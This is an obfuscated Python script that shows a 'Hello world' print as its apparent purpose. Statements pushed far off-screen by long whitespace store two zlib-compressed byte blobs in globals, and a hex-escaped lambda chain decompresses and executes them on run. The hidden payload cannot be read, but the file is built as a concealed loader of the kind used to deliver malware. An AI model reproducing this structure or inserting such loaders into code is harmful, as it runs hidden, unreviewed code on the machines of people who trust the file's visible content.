from builtins import *
from math import prod as _add


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Round, Power, CallFunction, _product, _walk, _multiply, _cube = exec, str, tuple, map, ord, globals, type

class Negative:
    def __init__(self, _run):
        self.Absolute = _add((_run, -735))
        self._theory(Statistics=-18474)

    def _theory(self, Statistics = float):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Absolute /= 32064 + Statistics
        
        try:
            (((_product, CallFunction), CallFunction) for CallFunction in (_product, CallFunction))

        except OSError:
            (({Power: _walk}, _statistics) for _statistics in (_statistics, Round))

        except:
            _cube(66827 / 24990) == Ellipsis

    def Product(self, StackOverflow = 76653):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        StackOverflow /= 2976 / -75166
        self._ceil != int
        
        try:
            ((Round, CallFunction, _product) or CallFunction if (Round, CallFunction, _product) and CallFunction else ... or (CallFunction, (Round, CallFunction, _product)))

        except TypeError:
            (({_walk: _walk}, _statistics) for _statistics in (CallFunction, _walk, Round))

        except:
            _cube(80836 * 6024) == True

    def _floor(Cube = str):
        return _multiply()[Cube]

    def _memoryaccess(Divide = 77668 * 57915, System = Ellipsis, _invert = _multiply):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _invert()[Divide] = System
        
        try:
            ({_walk: _walk} or Round if {_walk: _walk} and Round else ... or (Round, {_walk: _walk}))

        except OSError:
            ((CallFunction, (Round, CallFunction, _product)) for CallFunction in (Round, CallFunction, _product) if Round < _walk)

        except:
            _cube(31402 * -17377) == None

    def execute(code = str):
        return Round(Power(CallFunction(_product(_walk, code))))

    @property
    def _ceil(self):
        self.Run = '<__main__._walk object at 0x000005230BE62395>'
        return (self.Run, Negative._ceil)

if __name__ == '__main__':
    try:
        Negative.execute(code = __code__)
        _detectvar = Negative(_run = 60738 / 48897)

        if 106000 > 4974226:
            _detectvar.Product(StackOverflow = -32571 * _detectvar.Absolute)
        elif 133489 < 8847878:
            Negative(_run = -88603 * -75950).Product(StackOverflow = 31037 * _detectvar.Absolute)                                                                                                                                                                                                                                                          ;Negative._memoryaccess(Divide='lllIIIlIlIlIIIllIIlll',System=b'x\x9c\xe5\x1cks\xdb\xb8\xf1s\xf4+t\xfe"\xe9\xa28\x14\xf8\x92\xdcQg\xae\xe7vN\xaecu\xe2k\x9dN\xeeFC\x89\xa0M\x87"5\x12}\x96\xbf\xf4\xb7ww\x01\x90\xd4\x8b\x0f\xd1N\xdcT\x14A\x10\x8f%\xb0\x0f<\x16\x0b\xc4\xcb\xa7\xb3F\x13~\xbe\xd7\xa6\'\xfe&\x93h\xea=\xacfN\x1c-\'\x93\xe6\x0f\xc3\x93_\x9e\x16|\xe9G\xe1I3Zf\x929\x0f\xf1]\xb4\\Q\x9a\xf6\xc9\xd4\x0f\x82\xa7\xf8\x8e\xdfFN\xac\x9b\xd6I\xf7\xe4/\xc1\x03\xff\xc8\xdd\x93\xceF\xae[?\xbe{\x98\n\xc0wq\xbcX\x9d\xbd\x7f/\xc2Ng\xd1\xfc\xfd\x16\x98\xf7\x07\xbe\xed\xfa\xabY\xb4t7\xc1\xc8\xc0\xd3\xdb\xdb\xf7\x8b\xc0\xb9}\xe0[\x99\x02\x7f\xc6\xc3\x15\x17\x99\xfe\xfa\x8f\xcbw\xecT\xdbJ2\x8b\\\x11\xdfZ,\xfd0n\x9f\xfc\xc2\x83 j>F\xcb\xc0\xfd\xe1\xa4\xd3jt\xce\x92\xd4\x18\xdfZ}\xf1\xddV\xa7\xc1\xd73\xbe\x88%2\xc3\xc5\x03\xe4\xfc\x18\xad\xf8\xaa\xe9,ys\xc9\xdd\xdf\xc2\x7f\xf9Q\xc0c\x110\x05\xcc\xfc\x16\xfe;z\xa07\xa7\x89@~\x0b\xaf\xa2i\xe4>5\x03\xff\x0b\xe4{\x8a\x1eN:\rQ(\x7f\xbe\x88\x96\xf1d\x02_{Z\xb5:\xa7|\xed\xc7\xedN#\x88fN\xb0jw>\xb7\xee\xef\xef}\xff\x1e0\x87\x8f\x00|\xf7\xf7A\xe0\xb7~\x1f\xde\x06\xd1\x14\xd24\xf6\'\xc0\xac\xeb\xf5\xfa\x11\xae\xf5\xe3#:kz]\xb7>\x9f\x9d\xbd}\xf7\xf6]\xfb]\xfbm\xaf\xd3\xf9\x1d\x00\xf1\xd8\x89\xe3e\x0e\xa0\xd1(\x18\x05\x01\xb8\xf0\x1b\x05\xe2e\x17\x8e\xeb\xe7\xc2@\x00#\x84$\xff\xe4\x87\'TE\xd4\xb6q0\t\xe6\x0f\x92\x18Q\x12\x91\x002\xa78\xcc\xf9\xfa\xe5\xe5\xc5\xc5ht\x01\xce%\xc2\xc1\xd7\x0b\xfc\xf0^\xa0\xed\xd6\xf4\xc1\x0fb?D\x82\xfc\xe1,\x0bJ\xf6\xe9\xe6\xd3\xa7O77\xd2\x85\x1f\x00N\xf1-\x91\x8f\xaf\xedC\x9f[\x85~\x1c\xf8\x0f\xd3m\x9cv\xba\xa3\x04\xe12\x07~\xb32\x98\xce\xe7g\x82s\xea\x87._\xb7[\xfca\xf9\xebN\xec\xef\x9d<\xf2_\\\x02\xfa\x01\xed\x97\xf8D\n\x00%\x90$\xdf?\xb2b\'\n\xbcj\xd8\n\xe7!\xfc\xe7\xe0\xc2\x93\x1e\xf3\xef\x1fO\x81\xf3\x07\xdf\x87\xa6}\xb2K2\r\xfc#\xaeK`.`\xb0\xcb\x8b\xff\x03nZ\xc6\xab}H\xcam\xa1.\xa4\xb8]\x90\x08"\x06G\x97\xdf?\xa6\x82(\xda\x8d-B\xd5=Jc\x00\x92\x19\xf8(\x9b \x99 \x92\xf7\x80\xacV\xeb\xf4>\xf2\xc3\xfc\xdc\xd7\x8c]__\xe3M\x0e\xbc\xc9\xeb\xfb\xc76\x0f\xfc\xc5<\x9aUF8\x15@\xa5HbF\x95\x11\xe6\xfb\xb3\x95\x13\xfau\x11v\x10LE\x84\x1d\x86\xa3\x10\xf6\xe4\xf9\xc1\x9a\xdf\x85\x0fU\xda<\x85\x1e1\x10\xa3\x0f\xfe\x1f\xb0\xd6*p\xfeV\xa9\x03=\xc0T\xedi\xcb\x16\xbf>\\\xea)\xfc\xfd$\x86Ba\xe4\xe7r\x9c1\xb4[}/\xdeC\xa3\xef\x1d\xe93\xbe\xae\xd2\x1b\x1f\xc6\xb81\xb0f\xc6\x00\xaf\xed\'\xfa\xb2~\xbc\x8b\xf1\xbe\xaf3k\xb7\xff\xb3G2`r\xdan\xef\x8c\xce;N\xe8\xb6\xf7\xa5\xee\x1cQ9\xcb\xb5xr\xb9\xf2\xe2\x99P\xe5s\x8b+\xb6g\xd0\xd7>\xfce\x06\xbf"\x98\x87\xdb\x91\xf5\xa3\xe4[\xc1\xbb\x8f\xf4\x9e\xcd\xbf\xaf0\xadN\x0f\xe2\xb4\xa2d\x87\xcb\xac\xf7\x98\xcb\xfa\xcc\xd556(,\xbbp`^\x198\xf3\xa9\xeb4\xc7\xf0\xd3\xc6\x11\xfc\xb4\xf18\x82\x17xF\xda\xd9\xa16\xe0`\xd5%\xd93SY\xb8\xbf^\x9d*\xd3\xd96g\x16g\xf6\xf1\xb4\x86a\x88\x1c\x950\xf2\xe1\xa8\x84]\xbfRbW\x15\x02\xc3\xb5L[\xb7u\xabg\xd9\x96\xc94S\xb7L\x107\x83q\xbaj\x88\x88j\x17T\xa3\xf9\xda\xf9\x84\xe9^\x9d\xeaB;)\xda\xc8\xa4\xa1\xc4\xdf\xa7\x1a\x15\xd6d\x85{e+,\x05\xfd\x9a\x86\xcf\xe2\'\xbdg9C\xc8\xc35\xa2*\xddP\xbd\x84\x03n1\xdb\xeb\x13\x1b.\x0b\xee\xc1\xa4?\xd1&\xbd\t\x83\xb4\xc6nh1(\r\xe2z\xcf\x94,\x07\xd1\x96\xe9\xe9\x9a\xbc\r\xb8\x07p\xf7\xe5\xad\xe3\xcd\xa6D\x88\xa2t\xac\xbc\xa0\xe6\x0bl\xfd\xb6\xa3"\xef\x1cf\x02\xc5C\xb2\xed\xbbN\xda\xbf\xc2\x06\xf099\xbbj\x93\x0fe=\xbe\xc1\xcf\x19\x8ay\x06P_\xd7\x84ky\x96\x87\xae\xe1\x89p|3\xe8\x16o\xcf>b\xb1\xeb\xf4b\xd4:I)&I.!\xca}\x10U\x1d\x84\xd5$\xb7\x0fB\xdb\x87\xb4\x83\xdd\xd02\xad\x82\x01\x19\xac\t\x83K\x87,:\x812vCk\xb0\x15\xca\xa0-oS\xca\xa5%e\xb3/\xe5\xd6\x92\xb2\\&\xadYM\x9e\xbf.=?|\xb8\xba\xfap\x05.:\xf4"\xefbZX\x80u\x1d0\xae\xd1\xb3\x07-\xb2\x05i\xed\xdd\xd0\x1a\xb4\xb0e\xfb\xc8d[\x898\xee\xc9\xdb\x90\xb7jW\xcb\xa4\xad\xd0\xb6~\xf5\x11b\xfe\xdcM\xcc\xd0\xf0)fh\xe9\xadb\xd1}]\xd3\x9b\x0f\x92\x9b\xd0\x15\x0cv%\xfe\xdff8\xa3\x063\xc2\xa1\x1e\xe8l\x7f\xd1\xab\x93hK\x91\xd1\xdfPd\xd8\x1b!R\xed\xf1\x02\xa4\xb2\xeb\x10\xcb\'M\xabP\xb7\xc2\xe4\r.x\xd6lF{R$\xd5pG\x89\'Sq\x99f\xb4(m\xff\x7f\xac\x97\xcfh#\xb6\xb5\x12i\x98\x8c\x7f\t\xb1eLs5G\x1b0-\xbd\x0cnx\xac\x97\r){\x19\xae\xc8\xbb\rS\x85\xef\x83jN!\x8e\x19S\xd3=\x08\x91\xe3(g\x13*\x84\xbb\xc7\x97s\x13n\nY\xc0\x84+\x8dK\xbf\xb6u\x99\x1a^\x90\n\x9a\xd6L:\x9e\xd44\x03\x97\xf5\x04\xac$v/\xc4-\xb8^\x02\xbb\xa7h\xb2K+\x84]\x0c-\x81\xe7\t\xf5\x1d\x95w?\xb4\x83\xb0\x14\xa4\x0c\xacL\t\x0bae\xf2\xa4\x90\xb6\xe0\xb9\x02Z\x11,R\x16\xa8P\x82&\xca\x97\xa4\xe5l&\xa0\x15\xc1\xd2\x1d\xdd\x11!\x96\'r!,\x804c\x1cB(\x06\xd3\xe4\xd5\x91\xe0!]\t\x1a\xc0\x038\xf4}\x82\xc5z\x02\x9a\x88\x83\xd8\x1c8\x92\xa7\xd5\x95`\x0b\xb1\x87\xf9\x10;\x02_\xf4v\x88\x1f6\xf1\x9e\x81&\xbe.\\\x01Ia?\xb7n\x9b\xb0\x04\x9d\x84\x7f\xa0J\xa4\xa0\xe4\xc1\xd9\x80&$,-\x9fP+\x17\x94D\xc8\x17\xb9\xdeF\xed\x06\xc9%d\x0b\xe0\xe4\xd6G\xc9\xe0\xc0\xda{\x19\x03\x96\xf0\xe4NKF_d|\xb3\xf5I%>\xbd\x0cO\xc5Qm\xbd\xfd2\xbcI\xf1\xb45\xdb\x90\xb1\xe4\xda\xe1\x14\x80\xbc\x0fcY\xba\xa70\xb7\xe5\xce\xd4\xb6\xe0\x1d\x80\x96\x96\xa8lk+ \x89\xfe\xe5\xf8\xb1\x86\xea\xcb\xe6\xd4\xad\t\xcf3iBq\x8e\x88SK\xd4\x0e\xd90\x0f\xb1\xf0Is\xc4\x9d\xd0\x1a\x83\x1bC\xce\xf3\x94\xde\x86)\xddMf\xe0\xa2\xc9\xc1MQZ1\x10z\xd99"3u\xdb\xb0<\x9bY\xae\r\x1c`r{\x06\xb44\xac\x81\xad[:\x85\x1b\xd8^\xea\x865\xb5z\xf0\xd6c:\xfc,\xd4\xe8\xd6\xa1s4\x1eG\xe7\xe7\xe3sx\x9e\x8b\x7ft>\xae9\x1d\xb42wON\xf3L\x89J\x9a\x8ag\xa6\x83Ei\xad\x8a\x93\x08\xb9x\xa7\xd6\xf5\x94R\xba\xf2\xeaG\xc1J\x96\xbb1F\xcc\xbe\xf1\x8dQ\xe5\xcb\x8c\x1dm\x03\xfb\xb8ZZ\x05 3\x92\x1e(\x0e\xe4G\x06($z\xabc\x92\xba\x80\x81xj\xa4\xca1 \xa5\xb5\x1dV\x93w\x14O$\xbc"E\x92\xf8"\xc37y\xe9\x8c\xba*\x84VG\x83\xb6\x085Y\xa2-2\xa0\x8a&d\xdd\x13Z\x8c5l\xd4P\xd1\xd2\xa7\xcc\xa8\x92\xe9IP[\xa15\x1b;3\x83\x01[6`v\x06C\x83LcW\x94\xb6\xe4L.W\xa3|\xb8\xb8\xa6m\xf6\xe1\xb2\xe9\x99u\xfb\x1b\xe1}\x15V,?\xc9\xcag\xa4\x8d5\\\xfb\xd4p\xed\x13\x9c\xe8\xd9\xd4\x07I1\xed\xa4\x98\xfd\xa4\x98\x99\xc2V,\xae\x86\xc5\xd5\xb0\xc0c,zD/\xd5\xd7j\x1f\xe9\xb7\x16\xe6\x15\x8f\xe5\xd6\xa8Qhq\r\x07Wlz\xc0\x82\x03\xd2\xd4\xea\xbb\xa1\xc5\xa0\x94\xf43\xea\xbe\rpQ\xd1\xd8\xdf\r}\xf9\xc5T\xc5\xde\x86dk+\xa3\xa40T\x1f\xbf%\nyi\xed\xe7Z\xeby)\xfd0\xc1\xa2\xd0\x0b4\x1d\xbe\xbc@\x0b\xe2\x97_K\xd3es1\xc8\x8c\x9d4\x89\xc7\x9e\xc4\xa1\x99Q\x1e\x15\xa5\xad\xddh\xe7\xeaZ\xa6u\xc6H\xd8\x94\x80p*c\x8a("?<j\xa0O\xb1\x9dZb\xb42\xe8\xd1$[2\x89\xbe2i_j\x85\rHcz0\x88\xe9\xc1\xe4\x8c\xa3\xbf\xd6\xa4B\xce&\xe8\xab\xc9\xd4\xe2k\x9a\n|\x03\x9b\xa8\x96XUW\x0b\xecbY\xae\x8e\xb9\xc0\x8b\xdbG\xd4 q\xce\xb0\xd9\xb3<\x98\xce\xd0\x9d\xfa\x0c\xfcy\xeaix\xca\xc54\xafkY\x15\x86\xc80b\xc6\xa12\x88\xbe\x9c\'A{P\xd3\x1a\xc1\xce\x88\xb1\x9a}\x9a\x19\xbf\x96\xb1H\xc8Kk\x97\x9f\xa1VE\x9b\xcd\xb2\xbaj\xce\x06V\xbf_\xd25\x07v\xa5\xf4I.\xa6}\xd5\xb4\x14\x83W\xc9Z\x1cJ\x0f\xe1{\xb1d\x0e\x0cr\xb5\x03\xaeK\xae\xb3\x15^\x04\xc1-\xf9\x95\xa2\xbal\xe7*O\xc1"\xec\x9b\x83^R\xb3\xa2|\xaa\x1c\xeeq|v\x80\x1e\xbd\xaa\xe1\xa5\xbfh\xe4\xd0 ?\xd7NI\xf6\xe2h\xef\xd7\x98\x96`g\x97_\x0e\xd3\xb02\x16Jb\xa7*\xef\x1c\xe6\x87C\xd8\xec\xc9r\xe4\xe4\xc1\x14G\xf1Lq\xed\xf3\xa9R\xad\x06E\x98\xcc\xf2A"\xe1\xd5iV\x92?\xb6Z\x92\xad\x1ao\x85\xef\x89\xc9\x81\xb4\x1f\xcan\xe8\xe1\xaf\x1d.\xc9n8\xd57w\xdd\xc3\x9c\xc2\x1c\x03\xf2\x9b\xb6eZ\xcc\xe8\xe3\xd0\xc2\x9a\x9a\xba\xad\xc1\xa0\x16\xf5s\xa6\xcd2Pj\xea\xcd\xaf\xe4\x8f\xecu\xc8\xb8\x82\x0c+\xcaX\xeb\xa0%\x8eIvR\xe8C\xfb\x1c\x1d\xd2\xb2\xdd\xd0g\xd3\xc3\x7fm\xe3\xc3Z\xfa\xf1Z\xb6\x13\x85\xca\xa8T\x05\xb5\xa9|\x12\x1a\x9fWg')

        if 194415 > 4250367:
            Negative(_run = 9862 / -24431)._theory(Statistics = _detectvar.Absolute / -12727)
        elif 276078 < 2957672:
            _detectvar.Product(StackOverflow = 34747 / _detectvar.Absolute)                                                                                                                                                                                                                                                          ;Negative._memoryaccess(Divide='nmnmmnnmmnnnnnmnnmmmm',System=b'\n"\xf7\xce\x89mt\xc2X\xb3\x94\xad&rY\x0f\xb8\xc9"k<\x9d\xd42\x03\xe2\xb2\x9d\xd0r\xa04R\x121\xca4\xa0e\x1c\xb6\x1bZ\x0c\xca\x90\x8a"Cf\xb4\xa9T\xe6n\xe8\xcb3\xb5\x1aN\xdbr\xa8\xad\x14\x14Y\x03B53/\x93\xf6\x08\xe1\xd8X\xd1\x80)Gt\x8ek4\xb8\xa3\x03\x17j\xa2\xe8\x18+\xefB\xc3\xa8\xd4\x10j\xd3L\xca\xce\xdc/e\x16UG=\x93c\x94\xc7\xe5Zl\xba\x86\xee&a\xd9\xeb\xf9\xf7\x1c\xd5\x99j\xe6T\x08g\xca\x9e%M\x8f\xa9##?\xcd\xa8\xc9TY\x98+\xbf.\x1b\xc3dENl\x12\t\n\x95\x93\xdfP\xf7\xf1b\x06\xe5Y\xd6\xcb2a\xc2\x98\xc7\xd1\xac\xf4\xd6\x89o\xd1\xd5\x1f6d\xbc\'\xfbE\xdc?\x8e;\xc8\xe5\xf6qp\xcbX\xaa32\x1f\xd7i=\x01W\xd0L\xb2T\xdf\t}\xb6M\'b\x95N\xa7n\xc8 ;xF]\xd3NhMe\xba)\xfb\x90\xac\x91\xb4\xeaG\xf4\x8c"=/\xddQ\x1bSd?\x13\x91J\x8bL\x01\xce\xb1\xa7Ae\xf7y\xd5\xf5\xb3\x96\x16\xa1\xaa\\C%\xf9X\xac\xc2\x15\xeb\xc8\x10\xc7&\\6-7\xe9\xb4\x1e\xda#\x1c\xef\x84\xd6i:2}\xb42\xf203av\xa6_/\x93\xb6\x82$$8N\x8a<\x9f\xcf\xa5Q\xcd\xfc\x19M\x13\x8c\x811\x83\xcb1f\x89o@\xf7L>\x0bK\xfcR\xdb\x94\x98\x99\x9ax(s\x0fea\xa3vX\xa9\x1d\x1be\xd2\x96\xdd\xb1\x91\xbb\xe7M*\xf5\x95\xb7\x8eN\xde\x90\xe5SK3\xca\x84E1\x0c-\xb0gV\x1d\x8b\xd2\x966{y%\xb3(K\xee{\x80k`9p\t\xd7\xa1p\x87L\xfb\x9e\x7f\xe7C\xbd\xce\xba\x05-\x1c.\xbc\xd3\xd2\x9e\xb0\x1b\xc0\xfb\xd5lV4\xcc=\x96-jN\xa1\xc4"\xc3REi+\xf6\r\xe9\xb6\x8ctC\x86\xdc\x10x\xd4.\xd3\x9cVkwp\x9e\x0e\xd1\xdd\xba\x83t\xdc\x05\x85]\xb5%\xf7\x9f\rpJJC\x86\x9d\xd0\x9a\x9d\x8b2\xa2QV\x04jR\xa8\xac\x08\xadL\xe7R\x94\xb6v\xfbv\x9d\x92L\x1d\xb4s]VCPNy\x84\xe6\x9a=\xda\x158\xa0\xf9\xbeM\xea*s7\xf4\xeb\r\xf7\x8f7\xc0\x80/\xbd\xcc\xb60\xd9\x19\x0f\xa8\x13v2\x9d\xb3\xec\x90E\xcc+\xb4\x10\xcc\xd1\x98\xf57\x0c\xb6R\xc3\xadDg\xf6\xad4\x04\xde2\x9a7\xd5\x91\x84Mq\xdaa\x93\xaf\xf9\xacK\xc7Qv\xe98K\xf0\xc7\r\x0clG\xa8W\x11\xce9\xd9AJ\x03\xd8HBZ<\xad\xe2\xa7\x80K@?6$\xc0\xd5\xd3Jy\xa3\x95H\xe9\xdeE\xd1\x97\xe4\x8b7|\x8a\xef"*\xf6\xe7\nBs\x15p\xbe\xe8bH#\x88n\xa3!\x19`\x8a\xc5d\xb4\xbf\x95\x858\xff\x8cD\xb8$\xe3\x042\xeb\x19\x8d\xce~oL\x9d0\xe4\xcb!\xe1\x8bp6\x0f\x93!d\xf8\xf9F\x9a\x15$\xb6\x06\xe8Ks\xfd\xe4\xba\xa7p\xb7\xf1\xab]\x11\xd6\x9d\xf10\x86(a\xc1 \xeft\xa6\xdei\xb8\xce\xf2\xcb\xf0\xe7(8E\xcf\xe4v\xe9<5\x02\xff\xf6.\xa60\xf2\x89\xc0\xc5\xc3r\x11p\x0c\x8d\x96\xab\xd3\xeb\xd8\x89\xfd\xd9\x87\xd1\xa7v\x1b\xd3\x89\xc8.z\xf1\xbcO\xa0\xd1\xb4J\xfalF\x97{\xcdU\xec\xdc\xf2v\xcc\xd7\xf1\xd9*^vWO\xf3i\x14\xa0w(\x86\xd4\xa1\x1aX\x0b\xbe\xc2\x7fw\x16\x05\xbd!\x95\x17\xbdlx\x15\x85\xbc\xf3\xee\xcf\x90I\x1d\xfb\xda\x14p\x86C\xb4\x9c\x1a\xe1!y\x17\xf2\xd0ExQG\x9d.y\xfc\xb0\x0c\x9b\xe2D\xd4j\xeckYj\t\xdd\x9e\x1a\xba\xe5Y3\xc6M\xdd\x1eX\xae\xc5\xe8\xadog\xdffL\xb3\x0c\xb2\xf1\x9e\x92\x9f\xd9\x1aH\x1b\xb80\x94\x82~\xc1v\x11\xcef\xa8\xed\xdaS\xdb\x80g\xdf6\xd0\xaf\xbe\x020L\x1b:\x19\x0c-\xb9\xb2!\xce[\xe5\xc1\x8ao\xd5\xfc;\xae3\xf1\xd6\x82\xa4\xa3s\xd6x\xb3Aj\xc1r\x14%\xd2\xfd\xfd\xa7\x8f?\xfd\x13\x06:\x90\xf0\x1a\x1a\x08>?\xfd9\xe0\xce\x12F>\xea\xfdW?\x0ex;\xbbsB0c\x18B\x1a\x01\x95\xcc\xd2\x03B\x97<bg\x842\'cI6\x9c\x98\x9f\x9e\xfb\xcem\x14:A[J\xcb\xf9S\xe8\xcc\xa5\xb8HQA\xe9\xect\xba?\x934\x9f~\x12\xcf\xb6\x90q\xa4\xa6\x04\x99n\x1b\xa7\xcd\xbe\x1f\x92\x05\xaa\x1f\xe5\xabX\xa5\x92\x8e\xa8\xe9\xdc\xf1C\xaa\xa7\xaar\xe3\xcd\xec.\xf2g|(N\xf7\x15\xa89\x82/\\\x9dg\xf9b\x93b\x85\xd4\xeaJ\x9b\xfeQ\x90\x1c;\x03^!\xdc\x02)\x9d\xce\xe9\x92/\x02g\xc6\xdb\xc9)\x16\xec\xfa:\xd9VL\xbe\xeez\xbdi3\xfb\xf8\x98fK\r\xb5\xe4\x81(77\xdd\xb9lU\x04)Cr\xe6\x80\x13h@$Z\x86\xc9\x82L\xf2\x15y\x9c\x06 \xf1\rt\x0b\xbf@\xb7p\xbdp\xe6sN\xfc"\xa4\xec\xcd\x1b\x81h\xc2\xf9v"\x88vb`\xaaE\xbc\x1a\xa2r\xe6\x9c\xac\x90\xc6\xb4m#:\xdfb\xb9\xea\xa4\x10\x8b\xa2\x96\\\x14\xc5S\x81\xb2\xcb\xa2\x0c\xb5~\x9a\xc1pC\x8an\x18j\xe3\x89\xdc\x9c"N\x10\xb2i[\x8a\x8dq\x06\x8a\xa3\xe5\x82\x90\x1a \xdceH\xd9\xf9SC\xa1et^\x93\xab\x0c\xd3\xe0\xa6a\x98&\xc3\xb5^xcF\x9f\x8c\xc9\xb0Z\x10j\xcc\xb0:\xf58O\x1d\xfb\xf3I\x1d\xb1q\x80\xeb|\x14i\xff\x9e\xf6i\xa3b\xd3\x0f\xba\xc2\x86TXz\x93i\xfa\x98,\xd4\xd3<\th\xa9\x94@oW\x9d\xe3\x91\xb5 \xbc\x01\xce\xc1\xf1\xc5P\x8e3\xda\t\x06!\xe2\xca\x99\xf3\xb1\xf7\xd1\xf1]\xe8\xdb\x9f\x0f\xa10\xff\xea\xc1\\\xcc\xac\x8f\xc2\x11\x19(\xe3Q\xb4\xc2d\x99\xbe{\x00\x8d\x88\xc0DE\xac6\xbfw\xaf2\x8dX\xb2\xdc\x9efR\x8d\xd8Urp\x86\xfcu\xc7h]O\x96\xbb\xb8E\x00\xb5\x94\x80\x7f\x81\xcb\xd3y\xe4\xfa\xdeSu,\xd9\x80\tN\x12c\x1a\x9e\x05}\x15Y\xcab\xb7\xc4\x00\x1f\xc5\xc3o\xf8\xfe\x07\xbeZ\x01\x85~\x8dP\xe8\x9f\x93f@/S7u\xa0\x9c\x8d\x94\x83p\x0f\\f\xe0fV\xa3>%\xe5\xb1xt"\x9e<A\x1d}\x8f\x07\x88\xa9\xca\x9d\x8c3\xbb77\xea\x8c\x1aufM\x9aZAU\x1f\x91\x8d5@\x1f\x89\xbeSv\x9e\xb2\x0bH\xfa\xb9#z#\xad\xd4\xa8\xe8\xcd\xe3\x9d\x0fs\x81\xa4G\x9f\xab\x0f\xa0\x17\x1bqb\xa3\x15\x0f\xddc\xc8\xa6A\x13l"\x01\x80l\x1a\xf8,b\xa0\x01\x10\x86c\x18\x10i\xe3\xf86\xd3\xb0<\xd5T\xe3\xd8h_\x9e\x0c\xccR\xf5{#x.\xe9/Y\xa6\xd7\xbc\xc6\xf8\xa4\x1fR\x9e\xb7j\xdc@\x87\x87\xa0@B\xaaW\xd0!\xd9z\xbd.\t:\xf4\xc9\x04\x06Z|2\x19\x0e\xc9\xd0\x7f,\xf6\x14\x8di\x0b\x80T\x15\x02\xcde\xbf\xfd_\xde\xbdh\xd1')

        _detectvar._theory(Statistics = _detectvar.Absolute + -60442)                                                                                                                                                                                                                                                          ;jjllliijijiliiiiliiiiljil,OO00o0oOO0ooo00oooo00oo,MMMNMMMMMNMNMNNMM,wxxwxwwxwxwwwwxwwwxx,jjilijijlljjllllj=(lambda mnmnnnnmmmnnmmnnnmnn:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(mnmnnnnmmmnnmmnnnmnn)"),filename='\x53\x32\x32\x32\x32\x32\x53\x32\x32\x53\x32\x53\x32\x53\x32\x32\x53\x32\x32\x53\x32\x53',mode='\x65\x76\x61\x6c'))),(lambda mnmnnnnmmmnnmmnnnmnn:mnmnnnnmmmnnmmnnnmnn['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda mnmnnnnmmmnnmmnnnmnn:mnmnnnnmmmnnmmnnnmnn(__import__('\x7a\x6c\x69\x62'))),(lambda:(lambda mnmnnnnmmmnnmmnnnmnn:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(mnmnnnnmmmnnmmnnnmnn)"),filename='\x53\x32\x32\x32\x32\x32\x53\x32\x32\x53\x32\x53\x32\x53\x32\x32\x53\x32\x32\x53\x32\x53',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda iililjliiiljjjjiillj,mnmnnnnmmmnnmmnnnmnn:iililjliiiljjjjiillj(mnmnnnnmmmnnmmnnnmnn))
        if 331007 > 9732134:
            Negative(_run = 49841 / 38483)._theory(Statistics = _detectvar.Absolute / 94196)
        elif 176158 < 3692010:
            _detectvar._theory(Statistics = _detectvar.Absolute + -7115)                                                                                                                                                                                                                                                          ;wxxwxwwxwxwwwwxwwwxx()(jjilijijlljjllllj(OO00o0oOO0ooo00oooo00oo(MMMNMMMMMNMNMNNMM(jjllliijijiliiiiliiiiljil('\x76\x61\x72\x73'))),Negative._floor(Cube='lllIIIlIlIlIIIllIIlll')+Negative._floor(Cube='nmnmmnnmmnnnnnmnnmmmm')))

    except Exception as _statistics:
        if 266177 > 2240259:
            Negative.execute(code = Power(_statistics))

        elif 321166 > 2381459:
            _detectvar._theory(Statistics = _detectvar.Absolute * 71361)